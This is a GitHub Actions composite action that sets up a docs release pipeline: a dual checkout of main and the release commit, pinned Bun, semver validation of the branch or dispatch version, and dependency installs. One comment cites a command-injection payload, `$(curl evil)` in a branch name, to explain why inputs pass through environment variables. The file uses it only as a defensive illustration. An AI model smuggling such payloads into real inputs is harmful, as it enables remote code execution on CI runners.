name: Docs Release Setup
description: >
  Shared setup for the docs release pipelines (minor + patch). Performs the
  dual checkout that isolates `main` (commit/PR target) from the release
  commit (SDK source + CHANGELOG read), pins Bun, installs deps in both
  trees, and extracts the SDK version from the branch / dispatch input.

inputs:
  input-version:
    description: >
      `inputs.version` forwarded from the calling workflow when triggered via
      `workflow_dispatch`. Ignored for push events.
    required: false
    default: ""

outputs:
  version:
    description: "Semver `X.Y.Z` extracted from the branch name or dispatch input."
    value: ${{ steps.version.outputs.version }}

runs:
  using: composite
  steps:
    # Dual checkout to close the race window where a PR landing on `main`
    # mid-pipeline could smuggle a not-yet-released function into the
    # rendered API summary.
    #
    #   - main-tree    -> `main` HEAD: docs scripts, content target, PR base.
    #                     Always main HEAD so the workflow benefits from any
    #                     fixes to the pipeline itself.
    #   - release-tree -> SDK source + CHANGELOG_LLM frozen at the trigger
    #                     commit. SDK_PATH and CHANGELOG_REPO_ROOT point
    #                     here so TypeDoc + generate-release-notes can't
    #                     pick up unrelated commits that landed on main
    #                     after the trigger.
    # No explicit `token:` — defaults to `github.token` (read access), which is
    # all this checkout needs. The actual push of the docs branch is handled by
    # `peter-evans/create-pull-request` in the calling workflow, which receives
    # its own token directly (typically `secrets.DOCS_SYNC_PAT`) so the created
    # PR triggers downstream workflows.
    - name: Checkout main (docs scripts + commit target)
      uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # 6.0.2
      with:
        ref: main
        path: main-tree
        fetch-depth: 0

    - name: Checkout release commit (SDK source + CHANGELOGs)
      uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # 6.0.2
      with:
        ref: ${{ github.sha }}
        path: release-tree
        fetch-depth: 1
        sparse-checkout: |
          packages

    - name: Extract version
      id: version
      shell: bash
      # All attacker-controlled inputs (workflow_dispatch input, branch
      # ref) are passed through `env:` rather than templated into the
      # shell. Templating them would let a payload like `$(curl evil)`
      # in a branch name execute before the semver regex below can
      # reject it. See:
      # https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-an-intermediate-environment-variable
      env:
        EVENT_NAME: ${{ github.event_name }}
        INPUT_VERSION: ${{ inputs.input-version }}
        REF_NAME: ${{ github.ref_name }}
      run: |
        if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
          VERSION="$INPUT_VERSION"
        else
          BRANCH="$REF_NAME"
          VERSION="${BRANCH#release-sdk-}"
        fi
        if [ -z "$VERSION" ]; then
          echo "::error::Could not extract version"
          exit 1
        fi
        if ! echo "$VERSION" | grep -qE '^[0-9]+\.[0-9]+\.[0-9]+$'; then
          echo "::error::Invalid version format: $VERSION (expected X.Y.Z)"
          exit 1
        fi
        echo "version=$VERSION" >> "$GITHUB_OUTPUT"
        echo "Version: $VERSION"

    - name: Setup Bun
      uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # 2.2.0
      with:
        # Pinned (vs implicit `latest`) so a compromised Bun release can't
        # be picked up automatically. Keep in sync with the `bun: ^1.3.11`
        # devDep in docs/website/package.json.
        bun-version: 1.3.11

    - name: Install docs dependencies
      shell: bash
      working-directory: main-tree/docs/website
      run: bun install

    - name: Install SDK dependencies (release commit)
      shell: bash
      working-directory: release-tree/packages/sdk
      run: bun install
